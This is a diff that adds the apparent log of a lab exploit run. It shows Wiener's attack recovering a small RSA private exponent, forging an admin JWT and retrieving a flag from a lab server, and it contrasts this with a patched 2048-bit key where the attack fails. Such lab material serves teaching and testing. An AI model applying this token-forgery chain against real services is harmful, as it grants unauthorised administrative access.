@@ -1,0 +1,47 @@
+2025-12-26 09:09:47,877 - INFO - Logging to file: logs/attackC_20251226_090947.log
+2025-12-26 09:09:47,877 - INFO - ======================================================================================================================
+2025-12-26 09:09:47,877 - INFO -  Lab Vuln - Wiener's Attack on RSA with small d
+2025-12-26 09:09:47,899 - INFO - publickey: -----BEGIN PUBLIC KEY-----
+MIIBHzANBgkqhkiG9w0BAQEFAAOCAQwAMIIBBwKBgQC8rWJU6Ards7Btb1Soxj9s
+UwvHbC1lneSeaZFVCD+PNXAh0n4dYOxBAvIUq2wdxtD68LlnDALfSoCllporb+lF
+heKXH/yausIYH4qeC0pIEDsNUDXy6PwTtChyI3tsQTJWcZYyOs77oKpAJYCxUARX
+7AUt55UqSYIMkbGl4oyFFQKBgD14XoBgtAx2xvR6JUgYuKe07QT2bf/Uqx6RTNx5
+sD1k6s2Yh/iHMEJcf9jze7EeTDj7Saxtg4AHlEsP0EzmVZ2qyuElfkaqr4i9wIOV
+xovE/Zb8waq7T0t3NBeJ1vhv5iK+uKiMvUInRG/KtKitwbt6PTQPKft8wVfzc1Fn
+Wjzt
+-----END PUBLIC KEY-----
+2025-12-26 09:09:47,900 - INFO - [*] Parsed public key: n bitlen=1024, e=43165836764713451942510732090867132516270778103221544173148201893074711591629068210406143791639546597450491311780845901260139232481725929913100109532267825105851006893053134061865608532196858108623290593653874570665268883722449244440766292298121936487377944691299254249695785392166736881280411444835444735213
+2025-12-26 09:09:47,900 - INFO - [*] Running Wiener's attack ...
+2025-12-26 09:09:47,902 - INFO - [+] Wiener success: d=35762473301029667651075128871031384765264546687383148440642715793424108603941
+2025-12-26 09:09:47,916 - INFO - [+] Forged JWT:
+eyJhbGciOiJSUzI1NiIsImtpZCI6ImxhYi12dWxuIiwidHlwIjoiSldUIn0.eyJleHAiOjE3NjY3NDM3ODcsImlhdCI6MTc2Njc0MDE4Nywicm9sZSI6ImFkbWluIiwic3ViIjoiYXR0YWNrZXIifQ.RyhT1Buy64L28K6mUfj4PRsdpiIj9i9XdzGibwLufBF3dMKSI-cQa3EruYN54xgVYv2yrgQebwTiw_33ZOD_77_-2ROKX9iGzt0ZunPAq92Sagb2C2bDJGyudxjNtdlD-zDeQg2-DenhEl_ZxKMIVOJSrnz9usw1m3L6Y-yUOHE
+2025-12-26 09:09:47,917 - INFO - [+] Verified local signature OK
+2025-12-26 09:09:47,918 - INFO - [*] Trying admin endpoint (via cookie): http://http_server_c:8000/admin
+2025-12-26 09:09:47,921 - INFO - [*] /admin returned HTTP 200:
+2025-12-26 09:09:47,921 - INFO - {
+  "flag": "FLAG{weiner_attack_with_jwt}",
+  "message": "Welcome, admin!",
+  "ok": true,
+  "payload": {
+    "exp": 1766743787,
+    "iat": 1766740187,
+    "role": "admin",
+    "sub": "attacker"
+  },
+  "role": "admin"
+}
+2025-12-26 09:09:47,922 - INFO - [*] Complete. Total elapsed: 0.022s
+2025-12-26 09:09:47,922 - INFO - ======================================================================================================================
+2025-12-26 09:09:47,922 - INFO -  Lab Patched - Wiener's Attack on RSA with small d
+2025-12-26 09:09:47,925 - INFO - publickey: -----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAgghXm6Y3utVFMBOqzDDD
+KZ3uOkErtjaxBNCODzFwRCJ5KYxFbS/ZTOW3hWTa2B4iG3cBvH7RVtQjJVPdyOkx
+mDipWaSKHrgUicdqogmEycqJcW1aU+tbnIyhonhn7lPRnIwSH5YUfYu28hdXK5v8
+lhXkGET6ZjYwGTBbnpVzNxYU+yLLoONxcTF+fFW1fT0Ypl0Vu2m4Kcq3Y+/++Dd0
+hJHYCz1MqE0jVRyxJC4kdOv2fCuhJeBFjSKgl94hNPDbspAyE2dJq+UzR4CukU23
+eFKALJuIvT2Wq46z6GXD5Y3RFIrgHCll5oycoSBtUqCvRKFyXiq4zuhfA4yM3RQS
+mQIDAQAB
+-----END PUBLIC KEY-----
+2025-12-26 09:09:47,926 - INFO - [*] Parsed public key: n bitlen=2048, e=65537
+2025-12-26 09:09:47,926 - INFO - [*] Running Wiener's attack ...
+2025-12-26 09:09:47,926 - INFO - No weak d found.
